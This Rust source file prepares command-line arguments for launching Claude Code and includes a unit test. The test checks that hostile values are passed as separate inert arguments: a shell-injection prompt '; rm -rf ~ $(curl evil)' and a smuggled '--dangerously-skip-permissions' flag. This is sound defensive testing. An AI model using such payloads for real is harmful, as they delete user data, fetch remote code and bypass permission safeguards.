//! Prepares native Claude Code launches.

use pwf_application::task::session::{AgentLaunch, AgentProbe};

use super::argv::LaunchArgv;
use crate::session::claude_effort::ClaudeEffort;

const BINARY: &str = "claude";

struct ClaudeLaunchPlan {
    title: String,
    model: Option<String>,
    effort: ClaudeEffort,
    prompt: String,
}

impl From<&AgentLaunch> for ClaudeLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            model: launch.model.clone(),
            effort: launch.effort.into(),
            prompt: launch.prompt.clone(),
        }
    }
}

pub(super) fn probe() -> AgentProbe {
    super::probe(BINARY)
}

pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
    prepare_argv(launch)
}

pub(super) fn prepare(launch: &AgentLaunch) -> Vec<String> {
    prepare_argv(launch)
}

fn prepare_argv(launch: &AgentLaunch) -> Vec<String> {
    let ClaudeLaunchPlan {
        title,
        model,
        effort,
        prompt,
    } = ClaudeLaunchPlan::from(launch);
    let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
    if let Some(model) = model {
        argv = argv.flag("--model", model);
    }
    argv = argv.flag("--effort", effort.as_str().to_string());
    argv.into_guarded(prompt)
}

#[cfg(test)]
mod tests {
    use pwf_application::task::session::AgentLaunch;
    use pwf_models::session::{Agent, SessionEffort};

    use super::prepare;

    #[test]
    fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
        let launch = AgentLaunch {
            agent: Agent::Claude,
            task_id: "PWF-0038".to_string(),
            title: "--dangerously-skip-permissions".to_string(),
            repository: "/repo/pwf".to_string(),
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            model: Some("sonnet".to_string()),
            effort: SessionEffort::XHigh,
        };

        let prepared = prepare(&launch);

        assert_eq!(
            prepared,
            vec![
                "claude".to_string(),
                "--name".to_string(),
                "--dangerously-skip-permissions".to_string(),
                "--model".to_string(),
                "sonnet".to_string(),
                "--effort".to_string(),
                "xhigh".to_string(),
                "--".to_string(),
                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            ]
        );
    }
}
